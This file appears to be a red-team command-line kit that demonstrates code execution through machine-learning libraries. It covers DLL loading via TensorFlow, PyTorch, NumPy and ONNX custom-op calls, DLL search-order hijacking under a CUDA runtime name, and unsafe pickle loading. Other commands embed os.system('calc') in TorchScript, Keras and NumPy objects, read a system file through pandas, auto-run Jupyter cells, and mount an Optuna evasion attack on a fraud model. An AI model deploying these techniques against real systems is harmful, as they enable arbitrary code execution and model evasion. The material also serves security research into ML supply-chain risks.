import re
import typer
import inspect
from rich import print


def print_func(function):
    """
    Function to pretty print code after execution.
    """
    source = inspect.getsource(function)
    relevant_code = re.findall(r'###(.*)###', source, re.DOTALL)[0]
    print(relevant_code)


app = typer.Typer()

#----------------------------------#
#             TENSORFLOW           #
#----------------------------------# 
@app.command()
def tf_load_op_library():
    """
    Loads an op library, dll, so, or dylib via tf.load_op_library()
    """

    ###
    import tensorflow as tf
    tf.load_op_library("./bin/hello.dll")
    ###

    print_func(tf_load_op_library)

@app.command()
def tf_load_library():
    """
    Loads an op library, dll, so, or dylib via tf.load_library()
    """

    ###
    import tensorflow as tf
    tf.load_op_library("./bin/hello.dll")
    ###

    print_func(tf_load_library)

@app.command()
def tf_dll_hijack():
    """
    Writes a dll to search path prior to Tensorflow import.
    """
    
    ###
    import shutil
    shutil.copyfile("./bin/hello.dll", "./cudart64_110.dll")

    import tensorflow as tf
    ###

    print_func(tf_dll_hijack)


#----------------------------------#
#             PYTORCH              #
#----------------------------------# 
@app.command()
def torch_classes_load_library():
    """
    Loads a dll, so, or dylib via torch.classes.load_library()
    """

    ###
    import torch
    torch.classes.load_library("./bin/hello.dll")
    ###

    print_func(torch_classes_load_library)

@app.command()
def torch_load():
    """
    Standard torch.load()
    """

    ###
    import torch
    torch.load("./bin/model.pickle")
    ###

    print_func(torch_load)

@app.command()
def torch_jit():
    """
    Load code via torch.jit.load()
    """

    ###
    import torch

    class Calc(torch.nn.Module):
        def __init__(self):
            super().__init__()
            import os; os.system('calc')


    m = torch.jit.script(Calc())

    torch.jit.save(m, './bin/torch_jit.pt')
    torch.jit.load('./bin/torch_jit.pt')
    ###

    print_func(torch_jit)


# @app.command()
# def torch_cpp_extensions():
#   """
#   Load code via compiler provided in PyTorch.
#   """
#   # RuntimeError: Ninja is required to load C++ extensions
#   # pip install Ninja
#   import torch.utils.cpp_extension

# torch.utils.cpp_extension.load(
#     name="warp_perspective",
#     sources=["dllmain.cpp"],
#     # extra_ldflags=["-lopencv_core", "-lopencv_imgproc"],
#     is_python_module=False,
#     verbose=True
# )

#----------------------------------#
#             KERAS                #
#----------------------------------# 
# @app.command()
# def keras_layer():
#     """
#     Loads code via a custom keras Layer.
#     """
#     import numpy as np
#     import tensorflow as tf

#     def exec(x=10):
#         import os; os.system("calc")
#         return x

#     num_classes = 10
#     input_shape = (28, 28, 1)

#     model = tf.keras.Sequential(
#         [
#             tf.keras.Input(shape=input_shape),
#             tf.keras.layers.Conv2D(32, kernel_size=(3, 3), activation="relu"),
#             tf.keras.layers.MaxPooling2D(pool_size=(2, 2)),
#             tf.keras.layers.Conv2D(64, kernel_size=(3, 3), activation="relu"),
#             tf.keras.layers.MaxPooling2D(pool_size=(2, 2)),
#             tf.keras.layers.Flatten(),
#             tf.keras.layers.Dropout(0.5),
#             tf.keras.layers.Dense(num_classes, activation="softmax"),
#         ]
#     )


#     ###
#     model.add(tf.keras.layers.Lambda(lambda x: exec(x), name="custom"))
#     model.compile(loss="categorical_crossentropy", optimizer="adam", metrics=["accuracy"])

#     model.save("./bin/keras_layer.h5")
#     new_model = tf.keras.models.load_model("./bin/keras_layer.h5")
#     new_model.summary()
#     ###

#     print_func(keras_layer)


#----------------------------------#
#             NUMPY                #
#----------------------------------# 
@app.command()
def numpy_load_library():
    """
    Loads a dll, so, or dylib via numpy.ctypeslib.load_library()
    """

    ###
    import numpy
    numpy.ctypeslib.load_library("./bin/hello.dll", ".")
    ###

    print_func(numpy_load_library)

@app.command()
def numpy_load():
    """
    Standard numpy.load()
    """
    
    ###
    import numpy
    numpy.load('bin/model.pickle', allow_pickle=True)
    ###

    print_func(numpy_load)


@app.command()
def numpy_array():
    """
    Loads code through a numpy.asarray() call by implementing the __array__() method required by NumPy.
    """

    ###
    import numpy

    class ArrayExec:
        import os
        os.system('calc')

        def __array__(self):
            return 1

    
    numpy.asarray(ArrayExec)
    ###

    print_func(numpy_array)


#----------------------------------#
#             ONNX                 #
#----------------------------------# 
@app.command()
def onnx_convert_ort():
    """
    Loads code via a custom_op_library during conversion from ONNX to the internal ORT model format.
    """
    ###    
    import os
    os.system("python -m onnxruntime.tools.convert_onnx_models_to_ort ./bin/onnx --custom_op_library ./bin/custom_op.dll")
    ###

    print_func(onnx_convert_ort)

@app.command()
def onnx_session_options():
    """
    Loads code via ONNX SessionOptions.register_custom_ops(). 
    """

    ###
    import numpy
    import onnxruntime

    sess_options = onnxruntime.SessionOptions()
    sess_options.register_custom_ops_library("./bin/custom_op.dll")
    onnx_session = onnxruntime.InferenceSession("./bin/onnx/mnist-8.onnx", sess_options)
    ###

    print_func(onnx_session_options)


#----------------------------------#
#             PICKLE               #
#----------------------------------# 
@app.command()
def pickle_load():
    """
    Standard pickle.load()
    """

    ###
    import pickle

    with open('bin/model.pickle', 'rb') as fun:
        pickle.load(fun)
    ###

    print_func(pickle_load)


#----------------------------------#
#             PANDAS               #
#----------------------------------# 
@app.command()
def pandas_read_pickle():
    """
    Standard pandas.read_pickle()
    """

    ###
    import pandas

    pandas.read_pickle('./bin/model.pickle')
    ###

    print_func(pandas_read_pickle)


@app.command()
def pandas_read_csv():
    """
    Uses Pandas default behavoir to read a local file via fsspec
    """
    ###
    import pandas
    print(pandas.read_csv("file:////c://Windows//win.ini"))
    ###

    print_func(pandas_read_csv)

#----------------------------------#
#             SKLEARN              #
#----------------------------------# 
@app.command()
def sklearn_load():
    """
    Standard Sklearn joblib.load()
    """
    ###
    import joblib
    joblib.load('./bin/model.pickle')
    ###

    print_func(sklearn_load)

#----------------------------------#
#             JUPYTER              #
#----------------------------------# 
@app.command()
def jupyer_auto_load():
    """
    Jupyter autoload via %html
    """
    auto = """
%%html
<script>
    require(
        ['base/js/namespace', 'jquery'],
        function(jupyter, $) {
            $(jupyter.events).on("kernel_ready.Kernel", function () {
                jupyter.actions.call('jupyter-notebook:run-all-cells-below');
            });
        }
    );
</script>

"""


@app.command()
def optuna_attack():
    """
    Runs Optuna against the "discovered" number of input size for the toy model
    """
    import optuna
    import pickle

    model = pickle.load(open("./bin/fraud.pkl", "rb"))

    def objective(trial):
        input_data = []

        for feature in range(245):
            x = trial.suggest_int("feature_{}".format(feature), 0, 1000)
            input_data.append(x)

        # Target second class [0.99, 0.01]
        return model.predict_proba([input_data])[0][0]

    # Maximize just because
    study = optuna.create_study(direction="maximize")
    study.optimize(objective, n_trials=1000)


if __name__ == "__main__":
    app()
